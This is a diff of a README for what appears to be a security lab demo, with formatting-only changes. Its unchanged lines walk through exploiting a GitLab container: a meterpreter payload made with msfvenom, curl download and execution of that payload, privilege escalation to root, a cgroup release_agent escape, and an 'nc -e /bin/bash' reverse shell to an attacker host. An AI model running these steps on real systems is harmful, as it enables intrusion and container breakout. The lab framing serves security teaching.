@@ -24,13 +24,13 @@ end
 
 - install the following stuff
 
-``` bash
+```bash
 apt update && apt remove -y netcat-openbsd && apt install -y netcat-traditional
 ```
 
 - install docker
 
-``` bash
+```bash
 apt install -y ca-certificates curl gnupg lsb-release
 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
 echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
@@ -41,20 +41,20 @@ usermod -a -G docker vagrant
 
 - then your docker daemon is in [Rootless mode](https://docs.docker.com/engine/security/rootless/). you have to execute the following commands
 
-``` bash
+```bash
 apt install -y uidmap
 dockerd-rootless-setuptool.sh uninstall --force
 ```
 
 - build the container
 
-``` bash
+```bash
 docker build -t gitlab-escape -f ./Dockerfile .
 ```
 
 - start the GitLab application via docker-compose
 
-``` bash
+```bash
 docker-compose up
 ```
 
@@ -64,28 +64,28 @@ docker-compose up
 
 - create the meterpreter
 
-``` bash
+```bash
 msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=4242 -f elf > met
 ```
 
 - start the metasploit framework
 
-``` bash
+```bash
 msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
 ```
 
 - start the on liner web server
 
-``` bash
+```bash
 ruby -run -ehttpd . -p8001
 ```
 
 - execute the GitLab exploit
 
-``` bash
+```bash
 python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c 'curl -vk http://192.168.56.1:8001/met -o /tmp/met'
 
-python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c 'chmod 777 /tmp/met' 
+python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c 'chmod 777 /tmp/met'
 
 python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c '/tmp/met'
 ```
@@ -94,7 +94,7 @@ python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c '/tmp/m
 
 - get root within the GitLab container
 
-``` bash
+```bash
 id
 uid=998(git) gid=998(git) groups=998(git)
 
@@ -112,13 +112,13 @@ uid=0(root) gid=0(root) groups=0(root),998(git)
 
 - to execute the container escape, at first start a new netcat listner
 
-``` bash
+```bash
 nc -lvnp 4243
 ```
 
 - execute the following commands in your reverse root shell
 
-``` bash
+```bash
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgrp/release_agent
@@ -147,11 +147,11 @@ sh -c 'echo \$\$ > /tmp/cgrp/x/cgroup.procs'
 
 - reverse shell with netcat
 
-``` bash
+```bash
 echo "nc -e /bin/bash 192.168.56.1 4243" >> /cmd
 ```
 
-``` bash
+```bash
 echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)" > /tmp/cgrp/release_agent
 ```
 
@@ -165,13 +165,13 @@ curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
 
 - if you execute the following command and get `mount: /tmp/cgrp: permission denied.`
 
-``` bash
+```bash
 root@46646bb3e291:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
 
 - then your docker daemon is in [Rootless mode](https://docs.docker.com/engine/security/rootless/). you have to execute the following commands
 
-``` bash
+```bash
 mondoo@mondoo:~$ sudo apt-get install -y uidmap
 mondoo@mondoo:~$ dockerd-rootless-setuptool.sh uninstall
 + systemctl --user stop docker.service
@@ -184,6 +184,3 @@ Failed to disable unit: Unit file docker.service does not exist.
 ```
 
 - https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1
-
-
-
